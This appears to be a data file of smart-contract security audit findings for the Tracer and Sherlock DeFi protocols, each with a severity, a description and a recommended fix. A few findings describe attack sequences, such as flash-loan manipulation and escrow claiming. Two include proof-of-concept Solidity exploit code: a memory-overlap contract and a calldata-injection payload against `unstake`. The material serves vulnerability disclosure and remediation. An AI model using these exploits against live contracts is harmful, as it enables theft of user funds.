The contracts use Chainlink’s deprecated API `latestAnswer()`. Such functions might suddenly stop working if Chainlink stopped supporting deprecated APIs.

The impact is that, if the deprecated API stops working, prices cannot be obtained, the protocol stops and contracts have to be redeployed.

Recommend using V3 [interface functions](https://docs.chain.link/docs/price-feeds-api-reference/)."
16.md,No check `transferFrom()` return value,medium,"The smart contract doesn't check the return value of `token.transfer()` and `token.transferFrom()`, some erc20 token might not revert in case of error but return false.
In the [TracerPerpetualSwaps:deposit](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/TracerPerpetualSwaps.sol#L151) and [Insurance:deposit](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Insurance.sol#L51) this would allow a user to deposit for free. See issue page for other places.

Recommend wrapping the call into a `require()` or using openzeppelin's [SafeERC20 library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol)."
16.md,Deflationary tokens are not supported,medium,"There are ERC20 tokens that may make certain customizations to their ERC20 contracts.
One type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.

The `deposit()` functions of `Insurance` and `TracerPerpetualSwaps` assume that the external ERC20 balance of the contract increases by the same amount as the `amount` parameter of the `transferFrom`.

The user is credited the full amount without the taxes (`userBalance.position.quote`).

Recommend as one possible mitigation, measuring the asset change right before and after the asset-transferring functions."
16.md,Underflow problems occurring when a token has >18 decimals,medium,"The contracts assume that all tokens will have <=18 decimals. This isn't necessarily a problem if the Tracer team is the only people deploying the contracts and they keep it in mind. But, If the contracts are to be deployed by other people, this assumption should be made explicit and hard-coded.

We can see that the scaler computations will underflow and be defined when it should not be In [L220-L232](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/lib/LibBalances.sol#L220-L232).

Recommend writing a require check that ensures `tokenDecimals <= 18` before running the above functions."
16.md,Add reentrancy protections on function `executeTrade`,medium,"As written in the to-do comments, reentrancy could happen in the `executeTrade` function of `Trader` since the `makeOrder.market` can be a user-controlled external contract. See [L121-L126](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Trader.sol#L121-L126) in `Trader.sol`.

Recommend adding a reentrancy guard (e.g., the [implementation from OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol)) to prevent the users from reentering critical functions."
16.md,Single-step process for critical ownership transfer,medium,"The `Tracer Perpetuals Factory` contract is arguably the most critical contract in the project given that it deploys all the markets. The ownership of this contract is transferred to `_governance address`, i.e. TracerDAO, in the constructor. This critical address transfer in one-step is very risky because it is irrecoverable from any mistakes.

The impact is that, if an incorrect address (e.g. one for which the private key is not known) is used accidentally, then it prevents the use of all the `onlyOwner()` functions forever, which includes the changing of various deployer contract addresses and market approvals. This use of an incorrect address may not even be immediately apparent given that these functions are probably not used immediately. When noticed, due to a failing `onlyOwner()` function call, it will force the redeployment of the `factory` contract and require appropriate changes and notifications for switching from the old to new address. This will diminish trust in markets and incur a significant reputational damage. See [issue page](https://github.com/code-423n4/2021-06-tracer-findings/issues/43) for proof of concept.

Recommend retaining the deployer ownership in the constructor and then using a two-step address change to `_governance` address separately using setter functions:
1) Approve a new address as a `pendingOwner`
2) A transaction from the `pendingOwner` (TracerDAO) address claims the pending ownership change.

This mitigates risk because if an incorrect address is used in step (1), then it can be fixed by re-approving the correct address. Only after a correct address is used in step (1) can step (2) happen and complete the address/ownership change."
16.md,Malicious owner can arbitrarily change fee to any % value,medium,"The Tracer protocol like any other allows market creators to charge fees for trades. However, a malicious/greedy owner can arbitrarily change fee to any % value and without an event to observe this change or a timelock to react, there is no easy way for users to monitor this via front-end or off-chain monitoring tools.

The impact is that, if the users are trading on a market with 0.1% fees and the owner suddenly changes this to 100%, the users realise this only after their trades are executed. Market loses confidence. Protocol takes a reputational hit.

See similar Medium-severity finding in [ConsenSys's Audit of 1inch Liquidity Protocol](https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/#unpredictable-behavior-for-users-due-to-admin-front-running-or-general-bad-timing)

Recommend implementing an `Emit` event, and providing a timelock for users to react and establish an upper threshold for fees that is decided across markets by governance."
16.md,Missing events for critical parameter changing operations by owner,medium,"The owner of `TracerPerpetualSwaps` contract, who is potentially untrusted as per specification, can change the market critical parameters such as the addresses of the `Liquidation`/`Pricing`/`Insurance`/`GasOracle`/`FeeReceiver` and also critical values such as  `feeRate`, `maxLeverage`, `fundingRateSensitivity`, `deleveragingCliff`, `lowestMaxLeverage`, `insurancePoolSwitchStage` and whitelisting.

None of these setter functions emit events to record these changes on-chain for off-chain monitors/tools/interfaces to register the updates and react if necessary.

The impact of this is that, if a malicious owner changes the critical addresses or values that significantly change the security posture/perception of the protocol. No events are emitted and users lose funds/confidence. The protocol takes a reputation hit.

See similar high-severity finding in [OpenZeppelin’s Audit of Audius](https://blog.openzeppelin.com/audius-contracts-audit/#high) and medium-severity finding [OpenZeppelin’s Audit of UMA Phase 4](https://blog.openzeppelin.com/uma-audit-phase-4/).

Recommend to consider emitting events when these addresses/values are updated. This will be more transparent and it will make it easier to keep track of the status of the system."
16.md,Wrong funding index in settle when no base?,medium,"The `TracerPerpetualSwaps.settle` function updates the user's last index to `currentGlobalFundingIndex`, however a comment states:

> ""// Note: global rates reference the last fully established rate (hence the -1), and not the current global rate. User rates reference the last saved user rate""

The code for the `else` branch also updates the last index to `currentGlobalFundingIndex - 1` instead of `currentGlobalFundingIndex`.

```solidity
if (accountBalance.position.base == 0) {
    // set to the last fully established index
    // @audit shouldn't this be global - 1 like below?
    accountBalance.lastUpdatedIndex = currentGlobalFundingIndex;
    accountBalance.lastUpdatedGasPrice = IOracle(gasPriceOracle).latestAnswer();
}
```

The impact is that it might be possible for first-time depositors to skip having to pay the first funding rate period as the `accountLastUpdatedIndex + 1 < currentGlobalFundingIndex` check will still return `false` when the funding rates are updated the next time.

Recommend to check if setting it to `currentGlobalFundingIndex` or to `currentGlobalFundingIndex - 1` is correct."
16.md,`prb-math` not audited,medium,"The library [`prb-math` documents](// https://github.com/hifi-finance/prb-math#security) have not been audited by a security researcher.  This means its more risky to rely on this library.

Recommend considering (crowdsourcing) an audit for `prb-math`."
16.md,Claim liquidation escrow,medium,"A liquidator can always claim the liquidation escrow in the following way:
- create a second account
- setup a complimentary trade in that second account, which will result in a large slippage when executed
- call `executeTrade` (which everyone can call), to execute a trade between his own two accounts with a large slippage
- the slippage doesn't hurt because the liquidator owns both accounts
- call `claimReceipt` with the receiptId of the executed order, within the required period (e.g. 15 minutes)

[L67](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Trader.sol#L67)
```solidity
function executeTrade(Types.SignedLimitOrder[] memory makers, Types.SignedLimitOrder[] memory takers) external override {
```
[L394](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Liquidation.sol#L394)
```solidity
function claimReceipt( uint256 receiptId, Perpetuals.Order[] memory orders, address traderContract) external override {
```

Recommend to perhaps limit who can call `executeTrade`."
16.md,avoid paying insurance,medium,"It's possible to avoid paying insurance in the following way:

- once per hour (at the right moment), do the following:
1. using a flash loan, or with a large amount of tokens, call `deposit` of `Insurance.sol` to make sure that the pool is sufficiently filled (`poolHoldings` > `poolTarget`)
2. call the function `executeTrade` of Trader`.sol` with a minimal trade (possibly of value 0, see finding ""`executeTrade` with same trades"")
3. `executeTrade` calls `matchOrders`, which calls `recordTrade`
4. `recordTrade` calls `updateFundingRate()`;   (once per hour, so you have to be sure you do it in time before other trades trigger this)
5. `updateFundingRate` calls `getPoolFundingRate`
6. `getPoolFundingRate` determines the insurance rate, but because the insurance pool is sufficiently full (due to the flash loan), the rate is 0
7. `updateFundingRate` stores the 0 rate via `setInsuranceFundingRate`  (which is used later on to calculate the amounts for the insurances)
8. withdraw from the Insurance and pay back the flash loan

The insurance rates are 0 now and no-one pays insurance. The gas costs relative to the insurance costs + the flash loan fees determine if this is an economically viable attack. Otherwise it is still a grief attack.
This will probably be detected pretty soon because the insurance pool will stay empty. However its difficult to prevent.

See issue page for code referenced in proof of concept.

Recommend setting a timelock on withdrawing insurance."
16.md,Trader orders can be front-run and users can be denied from trading,medium,"The `Trader` contract accepts two signed orders and tries to match them. Once they are matched and become filled, they can therefore not be matched against other orders anymore.

This allows for a griefing attack where an attacker can deny any other user from trading by observing the mempool and front-running their trades by creating their own order and match it against the counter order instead.

In this way, a trader can be denied from trading. The cost of the griefing attack is that the trader has to match the order themselves, however depending on the liquidity of the order book and the spread, they might be able to do the counter-trade again afterwards, basically just paying the fees.

It could be useful if the attacker is a liquidator and is stopping a user who is close to liquidation from becoming liquid again.

This seems hard to circumvent in the current design. If the order book is also off-chain, the `executeTrade` could also be a bot-only function.


> Marked as a dispute as this is not really an issue. Tracer will initially maintain an off chain order book that is the entry point for users to make orders (and for market makers to interact with).
>
> Orders only get propagated on chain once they have been matched, and they will only be propagated on chain by whitelisted relayers. As such nobody can arbitrarily frontrun the orders with their own."
16.md,Zero-address checks are missing,low,"Zero-address checks are a best-practice for input validation of critical address parameters. While the codebase applies this to most addresses in setters, there are many places where this is missing in constructors and setters. Accidental use of zero-addresses may result in exceptions, burn fees/tokens or force redeployment of contracts.

Recommend adding zero-address checks.


> Duplicate of [#136](https://github.com/code-423n4/2021-06-tracer-findings/issues/136)
>
> More issues brought up in this one, but falls under the general category of missing zero address checks"
16.md,Can set values to more than 100%,low,"There are several setter functions that do not check if the amount is less than 100% including:

- `TracerPerpetualSwaps`: `setFeeRate`, `setDeleveragingCliff`, `setInsurancePoolSwitchStage`
- `Insurance`: `setFeeRate`, `setDeleveragingCliff`, `setInsurancePoolSwitchStage`

The impact is that setting values to more than 100% might lead to unintended functionality.

Recommend ensuring that the parameters are less than 100%."
16.md,LIQUIDATION_GAS_COST may not be a constant,low,"The gas cost for liquidation may change if code is updated/optimized, the compiler is changed or profiling is improved. The developers may forget to update this constant in code. The impact is that the margin validity calculation, which uses this value, may be affected if this changes and hence is not as declared in the constant. This may adversely impact validation.

Because It is safer to make this a constructor-set immutable value that will force usage of an updated accurate value at deployment time.

Recommend evaluating if the sensitivity to this value is great enough to justify a setter to change it if incorrectly initialized at deployment."
16.md,`Deposit` event should use the converted WAD amount,low,"The `Deposit` event uses the function parameter amount instead of the `convertedWadAmount` which is what is used to update the user’s position and TVL because it prevents any dust deposited in amount. This will also make it consistent with the emit event in the `withdraw` function.

The impact is that the`Deposit` event amount reflects the value with dust while the user position does not. This may lead to confusion.

Recommend using `uint256(convertedWadAmount)` instead of amount in `Deposit` event."
16.md,TVL calculation in `withdraw()` should use `convertedWadAmount` instead of `amount`,low,"The TVL calculation in `deposit()` uses `convertedWadAmount` but the one in `withdraw()` uses the parameter `amount`. While `amount` is still in WAD format, it may contain dust which is what the conversion to `rawTokenAmount` and then back to `convertedWadAmount` removes.

The impact of this is that use of `amount` in TVL during `withdraw()` will consider dust while the one in `deposit()` will not, which is inconsistent.

Recommend using `convertedWadAmount` instead of `amount` to be consistent with the increment during `withdraw()` TVL calculation."
16.md,Lack of a contract existence check may lead to undefined behavior,low,"delamo and pauliax_

Low-level calls `call`/`delegatecall`/`staticcall` return true even if the account called is non-existent (per EVM design).

Solidity documentation warns:
> ""The low-level functions `call`, `delegatecall` and `staticcall` return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed.”

Market address may not exist as a contract (e.g. incorrect EOA address used in orders), in which case low-level calls still returns true/success. But the trade is assumed to have been successfully executed.

As a result, `executeTrade()` executes batch orders against a non-existing market contract due to a mistake in the trading interface. The transaction executes successfully without any side-effects because the market doesn’t exist. Internal accounting is updated incorrectly.

See related High-severity finding in [ToB’s Audit of Hermez](https://github.com/trailofbits/publications/blob/master/reviews/hermez.pdf) and [ToB’s Audit of Uniswap V3](https://github.com/Uniswap/uniswap-v3-core/blob/main/audits/tob/audit.pdf). Also see [Warning in solidity documentation](https://docs.soliditylang.org/en/v0.8.0/control-structures.html#error-handling-assert-require-revert-and-exceptions).

https://github.com/code-423n4/2021-06-tracer/blob/74e720ee100fd027c592ea44f272231ad4dfa2ab/src/contracts/Trader.sol#L121-L129

Recommend that `makeOrder.market` should be checked for contract existence before the low-level call, and then verified to be the actual market contract (but it is not verified as noted in the comment). Evaluate if this is a greater concern than undefined behavior."
16.md,Using `tx.gasprice` to prevent front-running may lead to failed liquidations,low,"In `verifyAndSubmitLiquidation()`, the `tx.gasprice` is checked against the `fastGasOracle`’s current gas price presumably to prevent liquidators front-running others for the same market/account by using a gas price exceeding the current prevailing price as indicated by the `fastGasOracle`.

The impact is that, if the gas prices are increasing rapidly due to volatility or network congestion, or if the liquidation engines and `fastGasOracle` are out of sync on gas prices because of consulting different sources, then these liquidations will keep failing. Front-running risk on liquidations is not adequately protected by `tx.gasprice` check.

This logic may also be impacted by the upcoming inclusion of EIP-1559 in London fork which affect gas semantics significantly.

Liquidation bots front-running by monitoring mempool or the use of FlashBots for liquidation MEV, is a systemic challenge and not solved by using gasprice logic in contracts. Would recommend evaluating if the benefits match the failure modes."
16.md,Potential division by zero,low,"In function `minimumMargin()`, `maximumLeverage` being zero is not handled because it will result in div by zero as `PRBMathUD60x18.div` expects non-zero `diTracer`.

The impact is that various critical market functions will revert if `maximumLeverage` is zero. See issue page for effected code.

Recommend adding checks to make sure `maximumLeverage` is never zero or handle appropriately."
16.md,Unlocked pragma used in multiple contracts,low,"Most of the contracts use an unlocked pragma (e.g., `pragma solidity ^0.8.0`) which is not fixed to a specific Solidity version. Locking the pragma helps ensure that contracts do not accidentally get deployed using a different compiler version with which they have been tested the most. Please use `grep -R pragma .` to find the unlocked pragma statements in the codebase

Recommend locking pragmas to a specific Solidity version. Consider the compiler bugs in the following lists and ensure the contracts are not affected by them. It is also recommended to use the latest version of Solidity when deploying contracts (see [Solidity docs](https://docs.soliditylang.org/en/v0.8.6/)).

Solidity compiler bugs:
[Solidity repo - known bugs](https://github.com/ethereum/solidity/blob/develop/docs/bugs.json)
[Solidity repo - bugs by version](https://github.com/ethereum/solidity/blob/develop/docs/bugs_by_version.json)"
16.md,`LibMath` fails implicitly,low,"When `LibMath.abs` is called with -2^255 (`type(int256).min`), it tries to multiply it by `-1` but it'll fail as it exceeds the max signed 256-bit integers. The function will fail with an implicit error that might be hard to locate.

Recommend throwing an error similar to `toInt256` like `int256 overflow`."
16.md,`LibMath.sumN` can iterate over array,low,"When `LibMath.sumN` function does not check if `n <= arr.length` and can therefore fail if called with `n > arr.length`. The caller must always check that it's called with an argument that is less than `n` which is inconvenient.

Recommend changing the condition to iterate up to `min(n, arr.length)`."
16.md,todos left in the code,low,"There are several todos left in the code. See Issue page for list.
Recommend checking, fixing and removing the todos before it is deployed in production"
16.md,check sign in `calculateSlippage`,low,"In function `calculateSlippage` of `LibLiquidation.sol`, the value of `amountToReturn` is calculated by subtracting to numbers. Later on it is checked to see if this value is negative. However, `amountToReturn` is an unsigned integer so it can never be negative. If a negative number would be attempted to be assigned, the code will revert, because solidity 0.8 checks for this. See `LibLiquidation.sol` [L106](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/lib/LibLiquidation.sol#L106).
```solidity
function calculateSlippage(
...
    uint256 amountToReturn = 0;
    uint256 percentSlippage = 0;
    if (avgPrice < receipt.price && receipt.liquidationSide == Perpetuals.Side.Long) {
        amountToReturn = amountExpectedFor - amountSoldFor;
    } else if (avgPrice > receipt.price && receipt.liquidationSide == Perpetuals.Side.Short) {
        amountToReturn = amountSoldFor - amountExpectedFor;
    }
    if (amountToReturn <= 0) {    // can never be smaller than 0, because `amountToReturn` is uint256
        return 0;
    }
```

Recommend double checking if `amountToReturn` could be negative. If this is the case, change the type of `amountToReturn` to int256 and add the appropriate type casts."
16.md,The `averagePriceForPeriod` function may revert without proper error message returned,low,"The `averagePriceForPeriod` function of `LibPrices` does not handle the case where `j` equals 0 (i.e., no trades happened in the last 24 hours). The transaction reverts due to dividing by 0 without a proper error message returned.

Recommend adding `require(j > 0, ""..."")` before line 73 to handle this special case."
16.md,make sure `withdrawFees` always can withdraw,low,"If you call the function `withdrawFees` when ""TVL"" is not enough for the fee, then the code  would revert. In this case the fees cannot be withdrawn. Although it is unlikely that the TVL would be wrong, it is probably better to be able to withdraw the remaining fees.

`TracerPerpetualSwaps.sol` [L508](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/TracerPerpetualSwaps.sol#L508)
```solidity
function withdrawFees() external override {
    uint256 tempFees = fees;
    fees = 0;
    tvl = tvl - tempFees;

    // Withdraw from the account
    IERC20(tracerQuoteToken).transfer(feeReceiver, tempFees);
    emit FeeWithdrawn(feeReceiver, tempFees);
}
```

Recommend adding something like `tempFees = min (fees, tvl);`, and changing `fees=0` to `fees -= tempFees;`"
16.md,`matchOrders` could/should check market,low,"The function `matchOrders` of `TracerPerpetualSwaps.sol` doesn't check that the contract itself is indeed equal to `order1.market` and `order2.market`.

The function `executeTrade` in `Trader.sol`, which calls the `matchOrders`, can deal with multiple markets.

Suppose there would be a mistake in `executeTrade`,  or in a future version, the `matchOrders` would be done in the wrong market.

`TracerPerpetualSwaps.sol` [L216](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/TracerPerpetualSwaps.sol#L216)
```solidity
function `matchOrders`( Perpetuals.Order memory order1, Perpetuals.Order memory order2, uint256 fillAmount )
```

`Trader.sol` [L67](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Trader.sol#L67)
```solidity
 function `executeTrade`(Types.SignedLimitOrder[] memory makers, Types.SignedLimitOrder[] memory takers) external  override {
...
    (bool success, ) = makeOrder.market.call(
    abi.encodePacked(
        ITracerPerpetualSwaps(makeOrder.market).matchOrders.selector,
        abi.encode(makeOrder, takeOrder, fillAmount)
    )
);
```

`LibPerpetuals.sol` [L128](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/lib/LibPerpetuals.sol#L128)
```solidity
function canMatch( Order memory a, uint256 aFilled,Order memory b, uint256 bFilled ) internal view returns (bool) {
    ...
        bool marketsMatch = a.market == b.market;
```

Recommend adding something like:
```solidity
require ( order1.market == address(this), ""Wrong market"");
```
Note: `canMatch` already verifies that  `order1.market== order2.market`"
16.md,inclusive check that account is not above minimum margin,low,"Here the check `currentMargin` < `Balances.minimumMargin` should be inclusive <= to indicate the account is not above minimum margin:
```solidity
    require(
        currentMargin <= 0 ||
            uint256(currentMargin) < Balances.minimumMargin(pos, price, gasCost, tracer.trueMaxLeverage()),
        ""LIQ: Account above margin""
    );
```

Recommend using `uint256(currentMargin) <= Balances.minimumMargin`"
16.md,hardcoded `chainID`,low,"Hardcoding `chainID` is error-prone (in case you decide to deploy on a different chain and forget to change this, or if the chain forks, etc...):
`uint256 public constant override chainId = 1337;` // Changes per chain

Recommend better utilization of global variable `block.chainid`, or you can also retrieve `chainID` via [assembly]( https://ethereum.stackexchange.com/a/77550/17387).


> Disputing as an issue as while the suggested approach is a better solution (dynamically setting ChainID), deploying a Trader contract with the wrong ID does not affect the system. A new Trader can be deployed using the appropriate ChainID if one is accidentally deployed with the wrong ChainID.
>
> Currently this ChainID is just updated before deployment. The team will implement the dynamic approach moving forward.

_**Note:** Additional conversation regarding this vulnerability can be found [here](https://github.com/code-423n4/2021-06-tracer-findings/issues/67)_"
16.md,`Prices.averagePrice` does not show a difference between no trades and a zero price,low,"The `getHourlyAvgTracerPrice` and `getHourlyAvgOraclePrice` functions in `Pricing` return 0 if there is no trade during the given `hour` because of the design of `averagePrice`, which could mislead users that the hourly average price is 0. The same problem happens when emitting the old hourly average in the `recordTrade` function. See `Pricing.sol` [L254-L256](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Pricing.sol#L254-L256), [L262-L264](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Pricing.sol#L262-L264), and [L74](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Pricing.sol#L74).

Recommend returning a special value (e.g., `type(uint256).max`) from `averagePrice` if there is no trade during the specified hour to distinguish from an actual zero price. Handle this particular value whenever the `averagePrice` function is called by others."
16.md,Margin value is not checked to be non-negative in `leveragedNotionalValue`,low,"The `leveragedNotionalValue` function of `LibBalance` gets the margin value of a position (i.e., the `marginValue` variable) to calculate the notional value. However, the position's margin value is not checked to be non-negative. Margin with a value less than zero is considered invalid and should be specially handled. [L80](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/lib/LibBalances.sol#L80) in `LibBalances.sol`.

Recommend checking whether `marginValue` is less than zero and handle this case."
16.md,The `currentHour` variable in `Pricing` could be out of sync,low,"The `recordTrade` function in `Pricing` updates the `currentHour` variable by 1 every hour. However, if there is no trade (i.e., the `recordTrade` is not called) during this hour, the `currentHour` is out of sync with the actual hour. As a result, the `averagePriceForPeriod` function uses the prices before 24 hours and causes errors on the average price. See `Pricing.sol`  [L90-L94](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Pricing.sol#L90-L94).

Recommend calculating how much time passed (e.g., `(block.timestamp - startLastHour) / 3600`) to update the `currentHour` variable correctly."
16.md,Potential Out-of-Gas exception due to unbounded loop,low,"Trading function `executeTrade()` batch executes maker/taker orders against a market. The trader/interface provides arrays of makers/takers which is unbounded. As a result, if the number of orders is too many, there is a risk of this transaction exceeding the block gas limit (which is 15 million currently). See `Trader.sol` [L67](https://github.com/code-423n4/2021-06-tracer/blob/74e720ee100fd027c592ea44f272231ad4dfa2ab/src/contracts/Trader.sol#L67) and [L78](https://github.com/code-423n4/2021-06-tracer/blob/74e720ee100fd027c592ea44f272231ad4dfa2ab/src/contracts/Trader.sol#L78)

The impact is that if `executeTrade()` is called with too many orders in the batch, the transaction might exceed block gas limit and revert, resulting in none of the orders are executed.

See similar medium-severity finding from [ConsenSys's Audit of Growth DeFi](https://consensys.net/diligence/audits/2020/12/growth-defi-v1/#potential-resource-exhaustion-by-external-calls-performed-within-an-unbounded-loop).

Recommend limiting the number or orders executed based on `gasleft()` after every iteration, or estimating the gas cost and enforcing an upper bound on the number of orders allowed in maker/taker arrays."
16.md,Using array memory parameter without checking its length,low,"These array memory parameters can be  problematic if not used properly. For example, if the array is very large, it may overlap over other part of memory (`Liquidation.sol` [L274](https://github.com/code-423n4/2021-06-tracer/blob/74e720ee100fd027c592ea44f272231ad4dfa2ab/src/contracts/Liquidation.sol#L274)).

This an example to show the exploit:
```solidity
// based on https://github.com/paradigm-operations/paradigm-ctf-2021/blob/master/swap/private/Exploit.sol
pragma solidity ^0.4.24; // only works with low solidity version

contract test{
struct Overlap {
uint field0;
}
event log(uint);

function mint(uint[] memory amounts) public returns (uint) {
// this can be in any solidity version
Overlap memory v;
v.field0 = 1234;
emit log(amounts[0]); // would expect to be 0 however is 1234
return 1;
}

function go() public { // this part requires the low solidity version
uint x=0x800000000000000000000000000000000000000000000000000000000000000; // 2^251
bytes memory payload = abi.encodeWithSelector(this.mint.selector, 0x20, x);
bool success=address(this).call(payload);
}
}
```

Recommend checking array length before using it."
16.md,Wrong token approval,low,"The pool holdings of `Insurance` (`publicCollateralAmount` and `bufferCollateralAmount`) is in WAD (18 decimals) but it's used as a raw token value in `drainPool`

```solidity
// amount is a mix of pool holdings, i.e., 18 decimals
// this requires amount to be in RAW! if tracerMarginToken has > 18 decimals, it'll break, < 18 decimals will approve too much
tracerMarginToken.approve(address(tracer), amount);
// this requires amount to be in WAD which is correct
tracer.deposit(amount);
```

If `tracerMarginToken` has less than 18 decimals, the approval approves orders of magnitude more tokens than required for the `deposit` call that follows.
If `tracerMarginToken` has more than 18 decimals, the `deposit` that follows would fail as fewer tokens were approved, but the protocol seems to disallow tokens in general with more than 18 decimals.

Recommend converting the `amount` to a ""raw token value"" and approve this one instead."
21.md,Single under-funded protocol can break paying off debt,high,"The `SherXERC20.payOffDebtAll` function iterates over all protocols of the token.
If _a single project_ does not have enough funds to cover the premium payments, the transactions come to a halt, see `_payOffDebt`:

```solidity
debt = _accruedDebt(ps, _protocol, _blocks);
// this can revert tx
ps.protocolBalance[_protocol] = ps.protocolBalance[_protocol].sub(debt);
```

Many core functions require paying off debt first and can therefore revert when a single protocol cannot pay the token premium:
- `setTokenPrice`
- `setProtocolPremium`
- `withdrawProtocolBalance`
- `redeem`
- etc.

This scenario that a protocol is unable to pay a premium does not seem unlikely especially as there can be many protocols and each protocol can pay premiums in potentially many tokens and have to continuously re-deposit to their account to increase the balance.
It is also rather involved to remove the protocol's coverage and remove the premium payments for the token. It requires governance interaction and potentially paying for the accumulated debt themselves."
21.md,[Bug] A critical bug in `bps` function,high,"``` solidity
function bps() internal pure returns (IERC20 rt) {
  // These fields are not accessible from assembly
  bytes memory array = msg.data;
  uint256 index = msg.data.length;

  // solhint-disable-next-line no-inline-assembly
  assembly {
    // Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.
    rt := and(mload(add(array, index)), 0xffffffffffffffffffffffffffffffffffffffff)
  }
}
```

The above function is designed to expect the token at the end of `calldata`, but a malicious user can inject extra values at the end of `calldata` and fake return values.

The following contract demonstrates an example:

``` solidity
pragma solidity 0.8.6;

interface IERC20 {}

error StaticCallFailed();

contract BadEncoding {
  /// Will return address(1). But address(0) is expected!
  function f() external view returns (address) {
    address actual = address(0);
    address injected = address(1);

    (bool success, bytes memory ret) = address(this).staticcall(abi.encodeWithSelector(this.g.selector, actual, injected));

    if (!success) revert StaticCallFailed();

    return abi.decode(ret, (address));
  }
  function g(IERC20 _token) external pure returns (IERC20) {
    // to get rid of the unused warning
    _token;
    // Does it always match _token?
    return bps();
  }
  // From Sherlock Protocol: PoolBase.sol
  function bps() internal pure returns (IERC20 rt) {
    // These fields are not accessible from assembly
    bytes memory array = msg.data;
    uint256 index = msg.data.length;

    // solhint-disable-next-line no-inline-assembly
    assembly {
      // Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.
      rt := and(mload(add(array, index)), 0xffffffffffffffffffffffffffffffffffffffff)
    }
  }
}
```

This example can be used to exploit the protocol:

``` solidity
function unstake(
  uint256 _id,
  address _receiver,
  IERC20 _token
) external override returns (uint256 amount) {
  PoolStorage.Base storage ps = baseData();
  require(_receiver != address(0), 'RECEIVER');
  GovStorage.Base storage gs = GovStorage.gs();
  PoolStorage.UnstakeEntry memory withdraw = ps.unstakeEntries[msg.sender][_id];
  require(withdraw.blockInitiated != 0, 'WITHDRAW_NOT_ACTIVE');
  // period is including
  require(withdraw.blockInitiated + gs.unstakeCooldown < uint40(block.number), 'COOLDOWN_ACTIVE');
  require(
    withdraw.blockInitiated + gs.unstakeCooldown + gs.unstakeWindow >= uint40(block.number),
    'UNSTAKE_WINDOW_EXPIRED'
  );
  amount = withdraw.lock.mul(LibPool.stakeBalance(ps)).div(ps.lockToken.totalSupply());

  ps.stakeBalance = ps.stakeBalance.sub(amount);
  delete ps.unstakeEntries[msg.sender][_id];
  ps.lockToken.burn(address(this), withdraw.lock);
  _token.safeTransfer(_receiver, amount);
}
```

State token `Token1`. Let's say there is a more expensive token
`Token2`.

Here's an example exploit:

``` solidity
bytes memory exploitPayload = abi.encodeWithSignature(
  PoolBase.unstake.selector,
  (uint256(_id), address(_receiver), address(Token2), address(Token1))
);
poolAddress.call(exploitPayload);
```

All the calculations on `ps` would be done on `Token2`, but at the end, because of, `_token.safeTransfer(_receiver, amount);`, `Token2` would be transferred. Assuming that `Token2` is more expensive than `Token1`, the attacker makes a profit.

Similarly, the same technique can be used at a lot of other places. Even if this exploit is not profitable, the fact that the computations can be done on two different tokens is buggy.

There are several other places where the same pattern is used. All of them needs to be fixed. I've not written an exhaustive list."
21.md,Incorrect internal balance bookkeeping,medium,"The sherlock smart contract system uses internal bookkeeping of arbitrary ERC20 token balances. It doesn't assert that the ERC20 doesn't implement some non-standard behavior. For example, deflationary tokens, or tokens with a transfer fee, will result in incorrect internal balances. In summary, an attacker can perform stake and deposit actions without actually depositing the amount that sherlock assumes. As a result, an attacker is unduly rewarded balance and yield.

> Balancer had a similar vulnerability in their system https://blog.1inch.io/balancer-hack-2020-a8f7131c980e.

An example location where such internal bookkeeping happens can be found [here](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/PoolBase.sol#L271)

Mitigating the issue is possible by requiring the amount to be added to the contracts' balance. Alternatively, it's possible to update the pool based on actual balance changes."
21.md,`_doSherX` optimistically assumes premiums will be paid,medium,"The `_doSherX` function does not attempt to pay off the accrued premiums (""pay off debt"") for most tokens, only for the ones that would otherwise revert the tx:

```solidity
// Expensive operation, only execute to prevent tx reverts
if (amounts[i] > ps.sherXUnderlying) {
  LibPool.payOffDebtAll(tokens[i]);
}
```

The `amounts = LibSherX.calcUnderlying(totalSherX)` array is an optimistic view assuming all outstanding, accrued premiums would indeed be paid until now. However, it could be that a protocol does not have enough balance to pay out these premiums and updating the state using `LibPool.payOffDebtAll(tokens[i]);` would fail for a token.

An inflated amount is then paid out to the user based on the optimistic `calcUnderlying` call."
21.md,reputation risks with `updateSolution`,medium,"`GovDev.so`l has a function `updateSolution` to upgrade parts of the contract via the Diamond construction.
Via `updateSolution`, any functionality can be changed and all the funds can be accessed/rugged.
Even if this is well intended the project could still be called out resulting in a reputation risk, see for [example(https://twitter.com/RugDocIO/status/1411732108029181960).

Note: there is a function `transferGovDev` which can be used to disable the `updateSolution`
```solidity
// https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/GovDev.sol#L25
function updateSolution(IDiamondCut.FacetCut[] memory _diamondCut,address _init,bytes memory _calldata) external override {
  require(msg.sender == LibDiamond.contractOwner(), 'NOT_DEV');
  return LibDiamond.diamondCut(_diamondCut, _init, _calldata);
}
```
Recommend applying extra safeguards for example to limit the time period where `updateSolution` can be used."
21.md,Yield distribution after large payout seems unfair,medium,"When a large payout occurs, it will lower `unallocatedSherX`. This could mean some parties might not be able to get their Yield.

